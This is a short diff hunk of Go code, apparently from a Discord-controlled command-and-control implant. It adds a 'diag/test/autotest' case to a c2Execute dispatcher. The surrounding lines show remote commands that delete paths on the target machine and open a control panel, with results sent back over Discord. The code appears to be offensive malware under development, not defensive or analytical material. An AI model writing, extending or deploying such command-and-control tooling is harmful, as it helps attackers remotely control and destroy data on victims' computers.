@@ -517,6 +517,9 @@ func c2Execute(command string) {
 	case "rm", "suppr":
 		discordReply(deletePath(args))
 
+	case "diag", "test", "autotest":
+		discordReply(runDiag())
+
 	case "panel", "tableau", "dashboard":
 		ch := targetChannel()
 		if ch == "" {
